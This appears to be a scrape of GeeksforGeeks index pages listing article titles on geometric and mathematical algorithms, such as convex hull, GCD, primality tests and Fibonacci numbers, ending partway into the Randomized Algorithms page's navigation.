Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Write an Articleexpand_moreWrite ArticlesWrite Interview ExperienceGuidelines to WriteGet Technical Writing InternshipCC++JavaPythonMachine LearningInterview Preparationexpand_moreInterview Preparation For Software DevelopersMust Coding Questions - Company-wise Must Do Coding Questions - Topic-wiseCompany-wise Practice ProblemsCompany PreparationCompetitive ProgrammingSoftware Design-PatternsCompany-wise Interview ExperienceExperienced - Interview ExperiencesIntership - Interview ExperiencesPractice @Geeksforgeeksexpand_moreLeaderboard !!Topic-wise PracticeSubjective ProblemsDifficulty Level - SchoolDifficulty Level - BasicDifficulty Level - EasyDifficulty Level - MediumDifficulty Level - HardExplore More...Algorithmsexpand_moreAnalysis of AlgorithmsSearching AlgorithmsSorting AlgorithmsPattern SearchingGeometric AlgorithmsMathematical AlgorithmsRandomized AlgorithmsGreedy AlgorithmsDynamic ProgrammingDivide & ConquerBacktrackingBranch & BoundAll AlgorithmsData Structuresexpand_moreArraysLinked ListStackQueueBinary TreeBinary Search TreeHeapHashingGraphAdvance Data StructuresMatrixStringAll Data StructuresProgramming Languagesexpand_moreCC++JavaPythonC#Go LangSQLPHPScalaPerlKotlinWeb Technologiesexpand_moreHTMLCSSBootstrapJavaScriptJqueryReactJSNodeJSAngularJSDjango FrameworkTutorial Libraryexpand_morePython TutorialDjango TutorialPandas TutorialKivy TutorialTkinter TutorialOpenCV TutorialSelenium TutorialComputer Science Subjectsexpand_moreEngineering MathematicsOperating SystemsDBMSComputer NetworkComputer Organization & ArchitectureTOCCompiler DesignDigital Elec. & Logic DesignSoftware EngineeringGATE 2021expand_moreGATE CS NotesGate CornerPrevious Year GATE PapersLast Minute Notes (LMNs)Important Topic - GATE 2021GATE 2021 CourseUGC NET / ISROexpand_moreUGC NET Notes - Paper IIUGC NET Notes - Paper IIIUGC NET Solved PapersISRO CS Solved PapersISRO Official KeysISRO CSE SyllabusQUIZ Sectionexpand_moreC QuizC++ QuizJava QuizPython QuizData Structures QuizAlgorithms QuizAptitude QuizTopic-wise MCQsPuzzlesGeeksforgeeks Initiativesexpand_moreCampus Ambassador ProgramGeek Of The MonthGeek On The TOPCampus Geek Of The MonthTechnical Scripter EventComputer Science Projects Geometric Algorithms Recent Articles on Geometric Algorithms ! These algorithms are designed to solve Geometric Problems. They requires in-depth knowledge of different mathematical subjects like combinatorics, topology, algebra, differential geometry etc. For Example: Comparing Slopes of two lines, Finding Equation of a plane etc. Topics : Lines Triangle Rectangle | Square | Circle 3D Objects Quadilateral Polygon & Convex Hull Misc Quick Links Lines : How to check if two given line segments intersect? Given n line segments, find if any two segments intersect Klee’s Algorithm (Length Of Union Of Segments of a line) Count maximum points on same line Find an Integer point on a line segment with given two ends Minimum lines to cover all points Minimum block jumps to reach destination Program for Point of Intersection of Two Lines Represent a given set of points by the best possible straight line Program to find line passing through 2 Points Reflection of a point about a line in C++ Find points at a given distance on a line of given slope Number of ordered points pair satisfying line equation Check if a line passes through the origin Count of different straight lines with total n points with m collinear Number of horizontal or vertical line segments to connect 3 points Program to find the mid-point of a line Section formula (Point that divides a line in given ratio) Sum of Manhattan distances between all pairs of points Minimum number of points to be removed to get remaining points on one side of axis Program to find slope of a line Maximum integral co-ordinates with non-integer distances Direction of a Point from a Line Segment Find intersection point of lines inside a section Program to check if three points are collinear Triangle : Check whether a given point lies inside a triangle or not C program to find area of a triangle Count Integral points inside a Triangle Classify a triangle Maximum height when coins are arranged in a triangle Find all sides of a right angled triangle from given hypotenuse and area | Set 1 Maximum number of 2×2 squares that can be fit inside a right isosceles triangle Check if right triangle possible from given area and hypotenuse Triangle with no point inside Find all angles of a given triangle Program to find Circumcenter of a Triangle Number of Triangles that can be formed given a set of lines in Euclidean Plane Triangular Matchstick Number Number of jump required of given length to reach a point of form (d, 0) from origin in 2D plane Program to calculate area of Circumcircle of an Equilateral Triangle Check whether triangle is valid or not if sides are given Program to find third side of triangle using law of cosines Find the dimensions of Right angled triangle Program to calculate area and perimeter of equilateral triangle Count of acute, obtuse and right triangles with given sides Minimum height of a triangle with given base and area Maximum number of squares that can fit in a right angle isosceles triangle Rectangle | Square | Circle : Find if two rectangles overlap Check if four segments form a rectangle Check whether a given point lies inside a rectangle or not Minimum Perimeter of n blocks Number of rectangles in N*M grid Find Corners of Rectangle using mid points Coordinates of rectangle with given points lie inside Total area of two overlapping rectangles Program for Area And Perimeter Of Rectangle Program to find Perimeter / Circumference of Square and Rectangle Program for Area Of Square Number of unique rectangles formed using N unit squares How to check if given four points form a square Paper Cut into Minimum Number of Squares Program to find area of a circle Non-crossing lines to connect points in a circle Circle and Lattice Points Queries on count of points lie inside a circle Check whether a point exists in circle sector or not Pizza cut problem (Or Circle Division by Lines) Minimum revolutions to move center of a circle to a target Angular Sweep (Maximum points that can be enclosed in a circle of given radius) Check if a line touches or intersects a circle Check if a given circle lies completely inside the ring formed by two concentric circles Area of a Circumscribed Circle of a Square Path in a Rectangle with Circles Area of square Circumscribed by Circle Count ways to divide circle using N non-intersecting chords Find the center of the circle using endpoints of diameter Program to find area of a Circular Segment Program to find smallest difference of angles of two parts of a given circle Arc length from given Angle Area of a Circular Sector Find minimum radius such that atleast k point lie inside the circle Program to find Circumference of a Circle Check whether given circle resides in boundary maintained by two other circles Check if two given circles touch or intersect each other Count of obtuse angles in a circle with ‘k’ equidistant points between 2 given points 3D Objects : Find the perimeter of a cylinder Find the Surface area of a 3D figure Program for distance between two points on earth Calculate Volume of Dodecahedron Program for Volume and Surface area of Frustum of Cone Program to calculate volume of Octahedron Program for Surface Area of Octahedron Program to calculate area and volume of a Tetrahedron Divide cuboid into cubes such that sum of volumes is maximum Program to calculate Volume and Surface area of Hemisphere Maximize volume of cuboid with given sum of sides Program to calculate volume of Ellipsoid Program for volume of Pyramid Calculate volume and surface area of a cone Calculate Volume and Surface area Of Sphere Program for Volume and Surface Area of Cuboid Program for Volume and Surface Area of Cube Pythagorean Quadruple LS3/NS3 sphere generation algorithm and its implementation Quadrilaterals : Number of parallelograms when n horizontal parallel lines intersect m vertical parallellines Program for Circumference of a Parallelogram Program to calculate area and perimeter of Trapezium Program to find area of a Trapezoid Find all possible coordinates of parallelogram Maximum area of quadrilateral Check whether four points make a parallelogram Find the Missing Point of Parallelogram Polygon & Convex Hull : How to check if a given point lies inside or outside a polygon? Minimum Cost Polygon Triangulation Area of a polygon with given n ordered vertices Tangents between two Convex Polygons Regular polygon using only 1s in a binary numbered circle Find number of diagonals in n sided convex polygon Convex Hull | Set 1 (Jarvis’s Algorithm or Wrapping) Convex Hull | Set 2 (Graham Scan) Quickhull Algorithm for Convex Hull Convex Hull (Simple Divide and Conquer Algorithm) Dynamic Convex hull | Adding Points to an Existing Convex Hull Deleting points from Convex Hull Number of Pentagons and Hexagons on a Football Program to calculate are of Enneagon Program to calculate Area Of Octagon Area of a Hexagon Minimum area of a Polygon with three points given Misc : Find Simple Closed Path for a given set of points Orientation of 3 ordered points Number of Integral Points between Two Points Divide and Conquer | Set 2 (Closest Pair of Points) Closest Pair of Points | O(nlogn) Implementation Optimum location of point to minimize total distance n’th Pentagonal Number Find perimeter of shapes formed with 1s in binary matrix Count of parallelograms in a plane Minimum distance to travel to cover all intervals Rotation of a point about another point in C++ Draw geometric shapes on images using OpenCV Finding the vertex, focus and directrix of a parabola Program to check if water tank overflows when n solid balls are dipped in the water tank Program to check if tank will overflow, underflow or filled in given time Find if it’s possible to rotate the page by an angle or not Equable Shapes Find mirror image of a point in 2-D plane Quick Links : ‘Practice Problems’ on Geometry More Articles on Geometry >> If you like GeeksforGeeks and would like to contribute, you can also write an article and mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks. Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above. My Personal Notes arrow_drop_up Save Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most Popular Articles Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...Must Do Coding Questions Company-wiseProof that Clique Decision problem is NP-Complete | Set 2Top 5 IDEs for C++ That You Should Try OnceHow to find index of a given element in a Vector in C++ Most Visited Articles How to update Node.js and NPM to next version ?How to Hack WPA/WPA2 WiFi Using Kali Linux?How to Dynamically Add/Remove Table Rows using jQuery ?How to drop rows in Pandas DataFrame by index labels?How to create an empty DataFrame and append rows & columns to it in Pandas? room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Mathematical Algorithms - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Write an Articleexpand_moreWrite ArticlesWrite Interview ExperienceGuidelines to WriteGet Technical Writing InternshipCC++JavaPythonMachine LearningInterview Preparationexpand_moreInterview Preparation For Software DevelopersMust Coding Questions - Company-wise Must Do Coding Questions - Topic-wiseCompany-wise Practice ProblemsCompany PreparationCompetitive ProgrammingSoftware Design-PatternsCompany-wise Interview ExperienceExperienced - Interview ExperiencesIntership - Interview ExperiencesPractice @Geeksforgeeksexpand_moreLeaderboard !!Topic-wise PracticeSubjective ProblemsDifficulty Level - SchoolDifficulty Level - BasicDifficulty Level - EasyDifficulty Level - MediumDifficulty Level - HardExplore More...Algorithmsexpand_moreAnalysis of AlgorithmsSearching AlgorithmsSorting AlgorithmsPattern SearchingGeometric AlgorithmsMathematical AlgorithmsRandomized AlgorithmsGreedy AlgorithmsDynamic ProgrammingDivide & ConquerBacktrackingBranch & BoundAll AlgorithmsData Structuresexpand_moreArraysLinked ListStackQueueBinary TreeBinary Search TreeHeapHashingGraphAdvance Data StructuresMatrixStringAll Data StructuresProgramming Languagesexpand_moreCC++JavaPythonC#Go LangSQLPHPScalaPerlKotlinWeb Technologiesexpand_moreHTMLCSSBootstrapJavaScriptJqueryReactJSNodeJSAngularJSDjango FrameworkTutorial Libraryexpand_morePython TutorialDjango TutorialPandas TutorialKivy TutorialTkinter TutorialOpenCV TutorialSelenium TutorialComputer Science Subjectsexpand_moreEngineering MathematicsOperating SystemsDBMSComputer NetworkComputer Organization & ArchitectureTOCCompiler DesignDigital Elec. & Logic DesignSoftware EngineeringGATE 2021expand_moreGATE CS NotesGate CornerPrevious Year GATE PapersLast Minute Notes (LMNs)Important Topic - GATE 2021GATE 2021 CourseUGC NET / ISROexpand_moreUGC NET Notes - Paper IIUGC NET Notes - Paper IIIUGC NET Solved PapersISRO CS Solved PapersISRO Official KeysISRO CSE SyllabusQUIZ Sectionexpand_moreC QuizC++ QuizJava QuizPython QuizData Structures QuizAlgorithms QuizAptitude QuizTopic-wise MCQsPuzzlesGeeksforgeeks Initiativesexpand_moreCampus Ambassador ProgramGeek Of The MonthGeek On The TOPCampus Geek Of The MonthTechnical Scripter EventComputer Science Projects Mathematical Algorithms Recent articles on Mathematical Algorithms Topic : GCD and LCM Prime Factorization and Divisors Fibonacci Numbers Catalan Numbers Modular Arithmetic Euler Totient Function nCr Computations Set Theory Chinese Remainder Theorem Factorial Prime numbers and Primality Tests Sieve Algorithms Divisibility and Large Numbers Series Number Digits Triangles Algebra Number System Misc Quick Links GCD and LCM : GCD and LCM LCM of array GCD of array Basic and Extended Euclidean algorithms Product of given N fractions in reduced form GCD of two numbers when one of them can be very large Stein’s Algorithm for finding GCD GCD, LCM and Distributive Property Replace every matrix element with maximum of GCD of row or column GCD of two numbers formed by n repeating x and y times Count number of pairs (A <= N, B <= N) such that gcd (A , B) is B Array with GCD of any of its subset belongs to the given array First N natural can be divided into two sets with given difference and co-prime sums Minimum gcd operations to make all array elements one Program to find GCD of floating point numbers GCD of digits of a given number Series with largest GCD and sum equals to n Find pair with maximum GCD in an array GCD of elements in a given range Minimum operations to make GCD of array a multiple of k Largest Subset with GCD 1 Queries for GCD of all numbers of an array except elements in a given range Summation of GCD of all the pairs up to N Largest subsequence having GCD greater than 1 Largest subarray with GCD one More >> Prime Factorization and Divisors : Prime factors Smith Numbers Sphenic Number Hoax Number k-th prime factor of a given number Pollard’s Rho Algorithm for Prime Factorization Prime Factorization using Sieve O(log n) for multiple queries Find politeness of a number Find sum of even factors of a number Find sum of odd factors of a number Find largest prime factor of a number Find minimum sum of factors of number Finding power of prime number p in n! Find all divisors of a natural number | Set 1 Find all divisors of a natural number | Set 2 Find all divisors of a natural number Find numbers with n-divisors in a given range Find minimum number to be divided to make a number a perfect square Sum of all proper divisors of a natural number Sum of all the factors of a number Sum of largest prime factor of each number less than equal to n Sum of all divisors from 1 to n Check for Amicable Pair Prime Factorization using Sieve O(log n) for multiple queries Prime factors of a big number More >> Fibonacci Numbers : Fibonacci Numbers Interesting facts about Fibonacci numbers How to check if a given number is Fibonacci number? Zeckendorf’s Theorem (Non-Neighbouring Fibonacci Representation) Finding nth Fibonacci Number using Golden Ratio Matrix Exponentiation Fibonacci Coding n’th multiple of a number in Fibonacci Series GCD and Fibonacci Numbers Cassini’s Identity N-bonacci Numbers Space efficient iterative method to Fibonacci number The Magic of Fibonacci Numbers Program to print Fibonacci Triangle Factorial of each element in Fibonacci series Fibonomial coefficient and Fibonomial triangle Hosoya’s Triangle Prime numbers and Fibonacci Leonardo Number Fibonacci number in an array Fibonacci modulo p An efficient way to check whether n-th Fibonacci number is multiple of 10 Find Index of given fibonacci number in constant time Tail Recursion for Fibonacci Large Fibonacci Numbers in Java Even Fibonacci Numbers Sum Nth Even Fibonacci Number Finding number of digits in n’th Fibonacci number Non Fibonacci Numbers Sum of Fibonacci Numbers Count ways to reach the n’th stair Count Possible Decodings of a given Digit Sequence Program to print first n Fibonacci Numbers | Set 1 More >> Modular Arithmetic : Modular Exponentiation (Power in Modular Arithmetic) Modular multiplicative inverse Modular Division Multiplicative order Find Square Root under Modulo p | Set 1 (When p is in form of 4*i + 3) Find Square Root under Modulo p | Set 2 (Shanks Tonelli algorithm) Euler’s criterion (Check if square root under modulo p exists) Multiply large integers under large modulo Find sum of modulo K of first N natural number How to compute mod of a big number? Modulo 10^9+7 (1000000007) How to avoid overflow in modular multiplication? Find (a^b)%m where ‘a’ is very large Find power of power under mod of a prime Number of solutions to Modular Equations Recursive sum of digits of a number formed by repeated appends Find value of y mod (2 raised to power x) Modular multiplicative inverse from 1 to n Find unit digit of x raised to power y Given two numbers a and b find all x such that a % x = b Exponential Squaring (Fast Modulo Multiplication) Subsequences of size three in an array whose sum is divisible by m Distributing M items in a circle of size N starting from K-th position Discrete logarithm (Find an integer k such that a^k is congruent modulo b) Finding ‘k’ such that its modulus with each array element is same Fibonacci modulo p Maximum subarray sum modulo m Trick for modular division ( (x1 * x2 …. xn) / b ) mod (m) Count number of solutions of x^2 = 1 (mod p) in given range Breaking an Integer to get Maximum Product Program to find remainder without using modulo or % operator More >> Catalan Numbers : Catalan numbers Applications of Catalan Numbers Program for nth Catalan Number Dyck path Non-crossing lines to connect points in a circle Succinct Encoding of Binary Tree Find the number of valid parentheses expressions of given length More >> Euler Totient Function : Euler’s Totient Function Optimized Euler Totient Function for Multiple Evaluations Euler’s Totient function for all numbers smaller than or equal to n Primitive root of a prime number n modulo n Euler’s Four Square Identity nCr Computations : Binomial Coefficient Compute nCr % p | Set 1 (Introduction and Dynamic Programming Solution) Compute nCr % p | Set 2 (Lucas Theorem) Compute nCr % p | Set 3 (Using Fermat Little Theorem) Program to calculate value of nCr Probability for three randomly chosen numbers to be in AP Rencontres Number (Counting partial derangements) Sum of squares of binomial coefficients Find sum of even index binomial coefficients Maximum binomial coefficient term value Program for Binomial Coefficients table Sum of Binomial coefficients Space and time efficient Binomial Coefficient Count ways to express even number ‘n’ as sum of even integers Maximum points of intersection n circles Horner’s Method for Polynomial Evaluation Print all possible combinations of r elements in a given array of size n Program to find the Volume of a Triangular Prism Significance of Pascal’s Identity Sum of all elements up to Nth row in a Pascal triangle Chinese Remainder Theorem : Set 1 (Introduction) Set 2 (Inverse Modulo based Implementation) Cyclic Redundancy Check and Modulo-2 Division Using Chinese Remainder Theorem to Combine Modular equations Factorial : Factorial Legendre’s formula (Given p and n, find the largest x such that p^x divides n!) Sum of divisors of factorial of a number Count Divisors of Factorial Compute n! under modulo p Double factorial Count trailing zeroes in factorial of a number Factorial of a large number Primorial of a number Find the first natural number whose factorial is divisible by x Count numbers formed by given two digit with sum having given digits Generate a list of n consecutive composite numbers (An interesting method) Expressing factorial n as sum of consecutive numbers Find maximum power of a number that divides a factorial Trailing number of 0s in product of two factorials Print factorials of a range in right aligned format GCD of factorials of two numbers Largest power of k in n! (factorial) where k may not be prime One line function for factorial of a number Find all factorial numbers less than or equal to n Find the last digit when factorial of A divides factorial of B An interesting solution to get all prime numbers smaller than n Calculating Factorials using Stirling Approximation Check if a number is a Krishnamurthy Number or not Find a range of composite numbers of given length Smallest number S such that N is a factor of S factorial or S! Maximum value of an integer for which factorial can be calculated on a machine Smallest number with at least n digits in factorial Last non-zero digit of a factorial Smallest number with at least n trailing zeroes in factorial Count natural numbers whose factorials are divisible by x but not y Count digits in a factorial | Set 1 Count digits in a factorial | Set 2 No of Factors of n! Count factorial numbers in a given range Program for factorial of a number More >> Prime numbers and Primality Tests : Prime Numbers Special prime numbers Prime numbers and Fibonacci Left-Truncatable Prime Mersenne Prime Super Prime Palindromic Primes Prime Triplet Hardy-Ramanujan Theorem Rosser’s Theorem Fermat’s little theorem Composite Number Euclid Euler Theorem Euclid’s Lemma Primality Test | Set 1 (Introduction and School Method) Primality Test | Set 2 (Fermat Method) Primality Test | Set 3 (Miller–Rabin) Primality Test | Set 4 (Solovay-Strassen) Primality Test | Set 5 (Using Lucas-Lehmer Series) Vantieghems Theorem for Primality Test AKS Primality Test Lucas Primality Test 2^x + 1 and Prime Recursive program for prime number Circular primes less than n More >> Set Theory : Minimize the absolute difference of sum of two subsets Sum of all subsets of a set formed by first n natural numbers Sum of average of all subsets Bell Numbers (Number of ways to Partition a Set) Power Set Sieve Algorithms : Sieve of Eratosthenes Segmented Sieve Sieve of Atkin Sieve of Sundaram to print all primes smaller than n Sieve of Eratosthenes in 0(n) time complexity Arithmetic Number More >> Divisibility and Large Numbers : Check if a large number is divisible by 3 or not Number of digits to be removed to make a number divisible by 3 Find whether a given integer is a power of 3 or not Check if a large number is divisible by 4 or not Count rotations divisible by 4 Number of substrings divisible by 4 in a string of integers Check if a large number is divisible by 6 or not Prove that atleast one of three consecutive even numbers is divisible by 6 Sum of all numbers divisible by 6 in a given range Number of substrings divisible by 6 in a string of integers Print digit’s position to be removed to make a number divisible by 6 Check divisibility by 7 To check whether a large number is divisible by 7 Remainder with 7 for large numbers Count rotations divisible by 8 Given a large number, check if a subsequence of digits is divisible by 8 Check if a large number is divisible by 9 or not Decimal representation of given binary string is divisible by 10 or not Check if a large number is divisible by 11 or not Program to find remainder when large number is divided by 11 Divisibility by 12 for a large number Check if a large number is divisible by 13 or not Check if a large number is divisibility by 15 Check if a large number is divisible by 20 Number is divisible by 29 or not More >> Series : Juggler Sequence Padovan Sequence Aliquot Sequence Moser-de Bruijn Sequence Stern-Brocot Sequence Newman-Conway Sequence Sylvester’s sequence Recaman’s sequence Abundant Number Hexagonal Number Emirp numbers Nicomachus’s Theorem (Sum of k-th group of odd positive numbers) Sum of pairwise products Squared triangular number (Sum of cubes) Square pyramidal number (Sum of Squares) Program to print the sum of the given nth term Sum of series with alternate signed squares of AP Program for sum of cos(x) series Sum of range in a series of first odd then even natural numbers Sum of the sequence 2, 22, 222, ……… Sum of the series 5+55+555+.. up to n terms Sum of series 1^2 + 3^2 + 5^2 + . . . + (2*n – 1)^2 Sum of series 2/3 – 4/5 + 6/7 – 8/9 + ——- upto n terms Sum of the series 0.6, 0.06, 0.006, 0.0006, …to n terms n-th term in series 2, 12, 36, 80, 150…. Program to print tetrahedral numbers upto Nth term More >> Number Digits : n-th number whose sum of digits is ten Minimum digits to remove to make a number Perfect Square Count digits in given number N which divide N Count digit groupings of a number with given constraints Print first k digits of 1/n where n is a positive integer Program to check if a given number is Lucky Check if a given number can be represented in given a no. of digits in any base Find element using minimum segments in Seven Segment Display Find nth term of the Dragon Curve Sequence Find the Largest Cube formed by Deleting minimum Digits from a number Find next greater number with same set of digits Find the Number which contain the digit d Find nth number that contains the digit k or divisible by k Find N integers with given difference between product and sum Reverse a number using stack Check if a number is jumbled or not Number of digits in the product of two numbers Form the smallest number using at most one swap operation Difference between sums of odd and even digits Numbers having difference with digit sum more than s Count n digit numbers not having a particular digit Program to check Plus Perfect Number Total numbers with no repeated digits in a range K-th digit in ‘a’ raised to power ‘b’ Possible to make a divisible by 3 number using all digits in an array More >> Triangles : Time required to meet in equilateral triangle Trinomial Triangle Leibniz harmonic triangle Hosoya’s Triangle Number of triangles after N moves Find Perimeter of a triangle Check whether right angled triangle is valid or not for large sides Maximum height of triangular arrangement of array values Find other two sides of a right angle triangle Find coordinates of the triangle given midpoint of each side Number of possible Triangles in a Cartesian coordinate system Triangular Numbers Pascal’s Triangle Algebra : Find x and y satisfying ax + by = n Calculate the Discriminant Value Program for dot product and cross product of two vectors Iterated Logarithm log*(n) Program to find correlation coefficient Program for Muller Method Number of sextuplets (or six values) that satisfy an equation Complete the sequence generated by a polynomial Find the minimum value of m that satisfies ax + by = m and all values after m also satisfy Roots of Unity Number of non-negative integral solutions of a + b + c = n Roots of quadratic equation Find smallest values of x and y such that ax – by = 0 Generate Pythagorean Triplets Square root of an integer Find number of solutions of a linear equation of n variables Write an iterative O(Log y) function for pow(x, y) Program to add two polynomials Multiply two polynomials Count Distinct Non-Negative Integer Pairs (x, y) that Satisfy the Inequality x*x + y*y < n Fast method to calculate inverse square root of a floating point number in IEEE 754 format Efficient program to calculate e^x Number System : Exponential notation of a decimal number Check if a number is power of k using base changing method Check if number is palindrome or not in Octal Check if a number N starts with 1 in b-base Convert a binary number to hexadecimal number Program for decimal to hexadecimal conversion Converting a Real Number (between 0 and 1) to Binary String Count of Binary Digit numbers smaller than N Write a program to add two numbers in base 14 Convert from any base to decimal and vice versa Decimal to binary conversion without using arithmetic operators Misc : Tau – A Mathematical Constant Interquartile Range (IQR) Simulated Annealing Break the number into three parts Pseudo Random Number Generator (PRNG) Square root of a number using log Find ways an Integer can be expressed as sum of n-th power of unique natural numbers N’th palindrome of K digits N-th root of a number Fast Fourier Transformation for poynomial multiplication Find Harmonic mean using Arithmetic mean and Geometric mean Number of visible boxes after putting one inside another Generate a pythagoras triplet from a single integer Double Base Palindrome Program for Derivative of a Polynomial Sgn value of a polynomial Represent a number as sum of minimum possible psuedobinary numbers Program to print table of a number Compute average of two numbers without overflow Round-off a number to a given number of significant digits Convert a number m to n using minimum number of given operations Count numbers which can be constructed using two numbers Find Cube Pairs (A n^(2/3) Solution) Find the minimum difference between Shifted tables of two numbers Check if a number is a power of another number Check perfect square using addition/subtraction Number of perfect squares between two given numbers Count Derangements (Permutation such that no element appears in its original position) Print squares of first n natural numbers without using *, / and – Program to evaluate simple expressions Generate all unique partitions of an integer Random number generator in arbitrary probability distribution fashion Program to convert a given number to words Make a fair coin from a biased coin Generate integer from 1 to 7 with equal probability Print all combinations of balanced parentheses Print all combinations of points that can compose a given number Implement *, – and / operations using only + arithmetic operator Program to calculate area of an Circle inscribed in a Square Program to find the Area of Pentagon Program to find the Area and Volume of Icosahedron Quick Links : Practrice Problems on Mathematical Algorithms Quizzes on Mathematical Algorithms Videos on Mathematical Algorithms If you like GeeksforGeeks and would like to contribute, you can also write an article using contribute.geeksforgeeks.org or mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks. Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above. My Personal Notes arrow_drop_up Save Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most Popular Articles Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...Must Do Coding Questions Company-wiseProof that Clique Decision problem is NP-Complete | Set 2Major Kernel Functions in Support Vector Machine (SVM)Top 5 IDEs for C++ That You Should Try Once Most Visited Articles How to find index of a given element in a Vector in C++How to update Node.js and NPM to next version ?How to drop rows in Pandas DataFrame by index labels?How to create an empty DataFrame and append rows & columns to it in Pandas?Replace NaN Values with Zeros in Pandas DataFrame room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Randomized Algorithms - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Write an Articleexpand_moreWrite ArticlesWrite Interview ExperienceGuidelines to WriteGet Technical Writing InternshipCC++JavaPythonMachine LearningInterview Preparationexpand_moreInterview Preparation For Software DevelopersMust Coding Questions - Company-wise Must Do Coding Questions - Topic-wiseCompany-wise Practice ProblemsCompany PreparationCompetitive ProgrammingSoftware Design-PatternsCompany-wise Interview ExperienceExperienced - Interview ExperiencesIntership - Interview ExperiencesPractice @Geeksforgeeksexpand_moreLeaderboard !!Topic-wise PracticeSubjective ProblemsDifficulty Level - SchoolDifficulty Level - BasicDifficulty Level - EasyDifficulty Level - MediumDifficulty Level - HardExplore More...Algorithmsexpand_moreAnalysis of AlgorithmsSearching AlgorithmsSorting AlgorithmsPattern SearchingGeometric AlgorithmsMathematical AlgorithmsRandomized AlgorithmsGreedy AlgorithmsDynamic ProgrammingDivide & ConquerBacktrackingBranch & BoundAll AlgorithmsData Structuresexpand_moreArraysLinked ListStackQueueBinary TreeBinary Search TreeHeapHashingGraphAdvance Data 